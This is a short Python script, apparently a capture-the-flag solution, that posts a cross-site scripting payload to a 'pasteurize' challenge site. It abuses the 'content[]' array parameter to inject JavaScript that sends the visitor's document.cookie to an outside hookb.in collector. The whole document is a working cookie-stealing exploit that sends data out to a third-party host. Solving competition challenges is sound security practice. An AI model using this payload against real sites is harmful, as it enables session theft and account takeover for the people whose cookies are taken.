 #!/usr/bin/env python3

import requests

url = "https://pasteurize.web.ctfcompetition.com/"

r = requests.post(url, data= {
		"content[]":";new Image().src='https://hookb.in/jex0EogzRVIeBB23ODZj?c='+document.cookie//"
	})
print(r.text)